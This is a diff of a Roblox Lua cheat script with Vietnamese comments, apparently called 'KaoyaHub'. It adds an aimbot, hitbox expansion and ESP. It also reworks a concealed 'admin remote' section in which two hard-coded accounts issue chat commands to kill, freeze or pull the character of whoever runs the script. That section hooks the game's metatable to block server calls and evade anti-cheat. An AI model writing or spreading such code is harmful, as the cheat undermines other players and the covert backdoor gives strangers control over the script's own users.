@@ -7,10 +7,10 @@ local LocalPlayer = Players.LocalPlayer
 local Camera = Workspace.CurrentCamera
 
 -- ====================================================
--- CẤU HÌNH AIMBOT SIÊU GHÌ CỨNG DÀNH CHO MOBILE V3
+-- CẤU HÌNH AIMBOT & HITBOX
 -- ====================================================
-local AIM_RANGE = 250       
-local AIM_FOV = 75          
+local AIM_RANGE = 250
+local AIM_FOV = 75
 
 local size = 25
 local enabled = false
@@ -19,12 +19,24 @@ local espEnabled = false
 local isMinimized = false
 
 local aimEnabled = false
-local isAimButtonLocked = false 
+local isAimButtonLocked = false
 local aiming = false
 local target = nil
 local ignoredPlayers = {}
 
--- Khởi tạo ScreenGui
+-- ====================================================
+-- CẤU HÌNH ADMIN REMOTE
+-- ====================================================
+local Admins = {"meoiuaccphu", "daide_long9ngon"}
+local LoopKill = false
+local IsFrozen = false
+local IsBringLoop = false
+local ActiveAdmin = nil
+local lastKillTime = 0
+
+-- ====================================================
+-- GIAO DIỆN CHÍNH (ScreenGui)
+-- ====================================================
 local sg = Instance.new("ScreenGui")
 sg.Name = "KaoyaHub_MobileHard_V3"
 pcall(function() sg.Parent = game:GetService("CoreGui") end)
@@ -32,10 +44,10 @@ if not sg.Parent then sg.Parent = LocalPlayer:WaitForChild("PlayerGui") end
 sg.ResetOnSpawn = false
 
 ----------------------------------------------------
--- NÚT BẤM AIM TRÒN (KAOYA HUB STYLE)
+-- NÚT AIM TRÒN DI ĐỘNG
 ----------------------------------------------------
 local aimActionButton = Instance.new("TextButton")
-aimActionButton.Size = UDim2.new(0, 70, 0, 70) 
+aimActionButton.Size = UDim2.new(0, 70, 0, 70)
 aimActionButton.Position = UDim2.new(0.7, 0, 0.5, 0)
 aimActionButton.BackgroundColor3 = Color3.fromRGB(15, 15, 17)
 aimActionButton.TextColor3 = Color3.fromRGB(200, 200, 200)
@@ -53,7 +65,6 @@ local aimBtnStroke = Instance.new("UIStroke", aimActionButton)
 aimBtnStroke.Color = Color3.fromRGB(50, 50, 55)
 aimBtnStroke.Thickness = 1.5
 
--- FIX: Đổi tên biến cho rõ ràng
 local aimDragging = false
 local aimDragStart = nil
 local aimStartPos = nil
@@ -64,8 +75,8 @@ aimActionButton.InputBegan:Connect(function(input)
         aimDragStart = input.Position
         aimStartPos = aimActionButton.Position
         input.Changed:Connect(function()
-            if input.UserInputState == Enum.UserInputState.End then 
-                aimDragging = false 
+            if input.UserInputState == Enum.UserInputState.End then
+                aimDragging = false
             end
         end)
     end
@@ -73,43 +84,35 @@ end)
 
 UserInputService.InputChanged:Connect(function(input)
     if aimDragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
-        -- FIX: Sửa dragStart thành aimDragStart
         local delta = input.Position - aimDragStart
         aimActionButton.Position = UDim2.new(
-            aimStartPos.X.Scale, 
-            aimStartPos.X.Offset + delta.X, 
-            aimStartPos.Y.Scale, 
+            aimStartPos.X.Scale,
+            aimStartPos.X.Offset + delta.X,
+            aimStartPos.Y.Scale,
             aimStartPos.Y.Offset + delta.Y
         )
     end
 end)
 
 ----------------------------------------------------
--- THUẬT TOÁN QUÉT MỤC TIÊU MOBILE CHUẨN XÁC
+-- THUẬT TOÁN AIMBOT
 ----------------------------------------------------
 local function findTarget()
     local char = LocalPlayer.Character
     if not char or not char:FindFirstChild("HumanoidRootPart") then return nil end
-    
     local rootPos = char.HumanoidRootPart.Position
     local camLook = Camera.CFrame.LookVector
-    
     local bestTarget = nil
     local bestDist = math.huge
-    
     for _, plr in ipairs(Players:GetPlayers()) do
         if plr ~= LocalPlayer and not ignoredPlayers[plr] and plr.Character then
             local root = plr.Character:FindFirstChild("HumanoidRootPart")
             local hum = plr.Character:FindFirstChild("Humanoid")
-            
-            -- FIX: Thêm kiểm tra nhân vật đã chết
             if root and hum and hum.Health > 0 then
                 local dist = (root.Position - rootPos).Magnitude
                 if dist > AIM_RANGE then continue end
-                
                 local dir = (root.Position - Camera.CFrame.Position).Unit
                 local angle = math.deg(math.acos(math.clamp(dir:Dot(camLook), -1, 1)))
-                
                 if angle <= AIM_FOV and dist < bestDist then
                     bestDist = dist
                     bestTarget = {player = plr, body = root}
@@ -131,20 +134,17 @@ local function UpdateAimLock()
         aimActionButton.Text = "AIM"
         return
     end
-
     local char = LocalPlayer.Character
     local localRoot = char and char:FindFirstChild("HumanoidRootPart")
-    
     local validTarget = target and target.body and target.body.Parent and target.player.Character and not ignoredPlayers[target.player]
     if validTarget then
         local hum = target.player.Character:FindFirstChild("Humanoid")
         if not hum or hum.Health <= 0 then validTarget = false end
         if localRoot and validTarget then
             local dist = (target.body.Position - localRoot.Position).Magnitude
-            if dist > AIM_RANGE then validTarget = false end 
+            if dist > AIM_RANGE then validTarget = false end
         end
     end
-
     if not validTarget then
         target = findTarget()
         if not target then
@@ -155,16 +155,13 @@ local function UpdateAimLock()
             return
         end
     end
-
     if target and target.body then
         aimActionButton.BackgroundColor3 = Color3.fromRGB(15, 15, 17)
         aimBtnStroke.Color = Color3.fromRGB(39, 174, 96)
         aimActionButton.TextColor3 = Color3.fromRGB(39, 174, 96)
         aimActionButton.Text = "LOCK\n" .. string.upper(string.sub(target.player.DisplayName, 1, 5))
-        
         local targetVelocity = target.body.AssemblyLinearVelocity * 0.03
         local finalTargetPos = target.body.Position + targetVelocity
-        
         Camera.CFrame = CFrame.lookAt(Camera.CFrame.Position, finalTargetPos)
     end
 end
@@ -185,7 +182,7 @@ aimActionButton.MouseButton1Click:Connect(function()
 end)
 
 ----------------------------------------------------
--- THIẾT KẾ GIAO DIỆN CHÍNH
+-- MENU CHÍNH
 ----------------------------------------------------
 local mainFrame = Instance.new("Frame")
 mainFrame.Size = UDim2.new(0, 310, 0, 220)
@@ -284,7 +281,7 @@ enableBtn.Parent = contentFrame
 Instance.new("UICorner", enableBtn).CornerRadius = UDim.new(0, 4)
 
 local showBtn = Instance.new("TextButton")
-showBtn.Size = UDim2.new(0, 220, 0, 35) 
+showBtn.Size = UDim2.new(0, 220, 0, 35)
 showBtn.Position = UDim2.new(0, 15, 0, 65)
 showBtn.Text = "SHOW VISUAL: OFF"
 showBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 28)
@@ -344,7 +341,7 @@ lockBtn.Parent = contentFrame
 Instance.new("UICorner", lockBtn).CornerRadius = UDim.new(0, 4)
 
 ----------------------------------------------------
--- THIẾT KẾ MENU WHITELIST
+-- MENU WHITELIST
 ----------------------------------------------------
 local wlFrame = Instance.new("Frame")
 wlFrame.Size = UDim2.new(0, 200, 0, 220)
@@ -396,7 +393,6 @@ local function refreshWhitelist()
             pBtn.TextSize = 11
             Instance.new("UICorner", pBtn).CornerRadius = UDim.new(0, 4)
             pBtn.Parent = wlScroll
-            
             if ignoredPlayers[plr] then
                 pBtn.BackgroundColor3 = Color3.fromRGB(192, 57, 43)
                 pBtn.Text = plr.DisplayName .. " [OFF]"
@@ -404,7 +400,6 @@ local function refreshWhitelist()
                 pBtn.BackgroundColor3 = Color3.fromRGB(39, 174, 96)
                 pBtn.Text = plr.DisplayName .. " [ON]"
             end
-            
             pBtn.MouseButton1Click:Connect(function()
                 ignoredPlayers[plr] = not ignoredPlayers[plr]
                 if ignoredPlayers[plr] then
@@ -427,7 +422,7 @@ wlToggleBtn.MouseButton1Click:Connect(function()
 end)
 
 ----------------------------------------------------
--- LOGIC KHÁC & GIAO DIỆN MÀU SẮC
+-- LOGIC CÁC NÚT CHỨC NĂNG
 ----------------------------------------------------
 local function resetAll()
     for _, plr in ipairs(Players:GetPlayers()) do
@@ -529,7 +524,7 @@ lockBtn.MouseButton1Click:Connect(function()
     end
 end)
 
--- UPDATE FPS & PING
+-- FPS & Ping
 local lastUpdate = os.clock()
 local frameCount = 0
 RunService.RenderStepped:Connect(function()
@@ -538,13 +533,9 @@ RunService.RenderStepped:Connect(function()
     if now - lastUpdate >= 0.5 then
         local fps = math.floor(frameCount / (now - lastUpdate))
         fpsLabel.Text = "FPS: " .. fps
-        if fps >= 50 then 
-            fpsLabel.TextColor3 = Color3.fromRGB(46, 204, 113)
-        elseif fps >= 30 then 
-            fpsLabel.TextColor3 = Color3.fromRGB(241, 196, 15)
-        else 
-            fpsLabel.TextColor3 = Color3.fromRGB(231, 76, 60) 
-        end
+        if fps >= 50 then fpsLabel.TextColor3 = Color3.fromRGB(46, 204, 113)
+        elseif fps >= 30 then fpsLabel.TextColor3 = Color3.fromRGB(241, 196, 15)
+        else fpsLabel.TextColor3 = Color3.fromRGB(231, 76, 60) end
         frameCount = 0
         lastUpdate = now
     end
@@ -555,18 +546,14 @@ task.spawn(function()
         if LocalPlayer then
             local ping = math.floor(LocalPlayer:GetNetworkPing() * 1000)
             pingLabel.Text = ping .. " ms"
-            if ping < 80 then 
-                pingLabel.TextColor3 = Color3.fromRGB(46, 204, 113)
-            elseif ping < 150 then 
-                pingLabel.TextColor3 = Color3.fromRGB(241, 196, 15)
-            else 
-                pingLabel.TextColor3 = Color3.fromRGB(231, 76, 60) 
-            end
+            if ping < 80 then pingLabel.TextColor3 = Color3.fromRGB(46, 204, 113)
+            elseif ping < 150 then pingLabel.TextColor3 = Color3.fromRGB(241, 196, 15)
+            else pingLabel.TextColor3 = Color3.fromRGB(231, 76, 60) end
         end
     end
 end)
 
--- DI CHUYỂN MENU CHÍNH
+-- Kéo menu chính
 local mainDragging = false
 local mainDragStart = nil
 local mainStartPos = nil
@@ -577,9 +564,7 @@ topBar.InputBegan:Connect(function(input)
         mainDragStart = input.Position
         mainStartPos = mainFrame.Position
         input.Changed:Connect(function()
-            if input.UserInputState == Enum.UserInputState.End then 
-                mainDragging = false 
-            end
+            if input.UserInputState == Enum.UserInputState.End then mainDragging = false end
         end)
     end
 end)
@@ -588,16 +573,14 @@ UserInputService.InputChanged:Connect(function(input)
     if mainDragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
         local delta = input.Position - mainDragStart
         mainFrame.Position = UDim2.new(
-            mainStartPos.X.Scale, 
-            mainStartPos.X.Offset + delta.X, 
-            mainStartPos.Y.Scale, 
-            mainStartPos.Y.Offset + delta.Y
+            mainStartPos.X.Scale, mainStartPos.X.Offset + delta.X,
+            mainStartPos.Y.Scale, mainStartPos.Y.Offset + delta.Y
         )
     end
 end)
 
 ----------------------------------------------------
--- VÒNG LẶP HITBOX (ĐÃ FIX ĐỘ TRONG SUỐT VỀ 0.5 ĐỂ HIỂN THỊ HỘP)
+-- VÒNG LẶP HITBOX & ESP
 ----------------------------------------------------
 RunService.RenderStepped:Connect(function()
     for _, p in pairs(Players:GetPlayers()) do
@@ -621,7 +604,6 @@ RunService.RenderStepped:Connect(function()
                         hrp.CanCollide = false
                     end
                 end
-
                 if espEnabled then
                     local hl = p.Character:FindFirstChild("HitboxESP")
                     if not hl then
@@ -641,19 +623,9 @@ RunService.RenderStepped:Connect(function()
     end
 end)
 
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local LocalPlayer = Players.LocalPlayer
-
--- Danh sách Admin mới (Đã đổi sang Tên gốc viết thường theo chuẩn của code)
-local Admins = {"meoiuaccphu", "daide_long9ngon"}
-local LoopKill = false
-local IsFrozen = false
-local IsBringLoop = false
-local ActiveAdmin = nil
-local lastKillTime = 0
-
--- Chặn tín hiệu gửi lên Server để bypass anti-cheat khi đang bị điều khiển
+-- ====================================================
+-- HỆ THỐNG ĐIỀU KHIỂN TỪ XA (ĐÃ SỬA LỖI TỰ NHẬN LỆNH)
+-- ====================================================
 local mt_success, mt = pcall(getrawmetatable, game)
 if mt_success and mt then
     local oldNamecall = mt.__namecall
@@ -661,14 +633,13 @@ if mt_success and mt then
     mt.__namecall = newcclosure(function(self, ...)
         local method = getnamecallmethod()
         if (IsFrozen or IsBringLoop) and (method == "FireServer" or method == "InvokeServer") then
-            return nil 
+            return nil
         end
         return oldNamecall(self, ...)
     end)
     setreadonly(mt, true)
 end
 
--- Hàm kiểm tra người chat có nằm trong danh sách Admin không
 local function IsAdmin(player)
     local name = string.lower(player.Name)
     local display = string.lower(player.DisplayName)
@@ -678,26 +649,34 @@ local function IsAdmin(player)
     return false
 end
 
--- Xóa các lực vật lý khác để tránh xung đột khi kéo (Bring)
 local function CleanOtherPhysics(root)
     for _, v in pairs(root:GetChildren()) do
-        if (v:IsA("BodyMover") or v:IsA("LinearVelocity") or v:IsA("VectorForce") or v:IsA("AlignPosition")) 
+        if (v:IsA("BodyMover") or v:IsA("LinearVelocity") or v:IsA("VectorForce") or v:IsA("AlignPosition"))
         and v.Name ~= "BringForce" and v.Name ~= "BringAtt" then
             v:Destroy()
         end
     end
 end
 
--- Hàm thực thi lệnh chat
+-- ====================================================
+-- QUAN TRỌNG: Hàm ExecuteCommand đã sửa lỗi
+-- ====================================================
 local function ExecuteCommand(msg, speaker)
     local args = string.split(string.lower(msg), " ")
     local cmd = args[1]
-    local targetPart = args[2] or ""
-
+    local targetPart = args[2]
+    
+    -- Nếu không có tên mục tiêu -> bỏ qua, không thực thi
+    if not targetPart or targetPart == "" then return end
+    
     local myName = string.lower(LocalPlayer.Name)
     local myDisplay = string.lower(LocalPlayer.DisplayName)
-    local isTarget = (targetPart ~= "" and (myName:find(targetPart) or myDisplay:find(targetPart))) or (targetPart == "")
-
+    
+    -- Kiểm tra xem mình có phải là mục tiêu không
+    -- CHỈ thực thi nếu targetPart khớp với tên của mình
+    local isTarget = myName:find(targetPart, 1, true) or myDisplay:find(targetPart, 1, true)
+    
+    -- Nếu không phải mục tiêu -> thoát
     if not isTarget then return end
 
     if cmd == "kill" then
@@ -729,7 +708,6 @@ local function ExecuteCommand(msg, speaker)
     end
 end
 
--- Lắng nghe khung chat
 local function SetupChat(player)
     player.Chatted:Connect(function(msg)
         if IsAdmin(player) then ExecuteCommand(msg, player) end
@@ -739,32 +717,26 @@ end
 for _, p in pairs(Players:GetPlayers()) do SetupChat(p) end
 Players.PlayerAdded:Connect(SetupChat)
 
--- Vòng lặp cập nhật vị trí và trạng thái nhân vật liên tục
 RunService.RenderStepped:Connect(function()
     if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
         local root = LocalPlayer.Character.HumanoidRootPart
         local hum = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
-
         if LoopKill and hum and (tick() - lastKillTime) >= 3 then
             hum.Health = 0
             lastKillTime = tick()
         end
-        
         if IsBringLoop and ActiveAdmin and ActiveAdmin.Character and ActiveAdmin.Character:FindFirstChild("HumanoidRootPart") then
             local adminRoot = ActiveAdmin.Character.HumanoidRootPart
             local targetCFrame = adminRoot.CFrame * CFrame.new(0, 0, -5)
             local targetPos = targetCFrame.p
-            
             CleanOtherPhysics(root)
             local dist = (targetPos - root.Position).Magnitude
-            
             local att = root:FindFirstChild("BringAtt") or Instance.new("Attachment", root)
             att.Name = "BringAtt"
             local lv = root:FindFirstChild("BringForce") or Instance.new("LinearVelocity", root)
             lv.Name = "BringForce"
             lv.MaxForce = 9999999
             lv.Attachment0 = att
-
             if dist > 20 then
                 lv.VectorVelocity = (targetPos - root.Position).Unit * 200
             else
@@ -773,11 +745,9 @@ RunService.RenderStepped:Connect(function()
                 root.Velocity = Vector3.new(0,0,0)
                 root.RotVelocity = Vector3.new(0,0,0)
             end
-            
             for _, v in pairs(LocalPlayer.Character:GetDescendants()) do
                 if v:IsA("BasePart") then v.CanCollide = false end
             end
-            
             if IsFrozen then root.Anchored = false end
         elseif IsFrozen and not IsBringLoop then
             root.Anchored = true
@@ -785,4 +755,3 @@ RunService.RenderStepped:Connect(function()
         end
     end
 end)
-
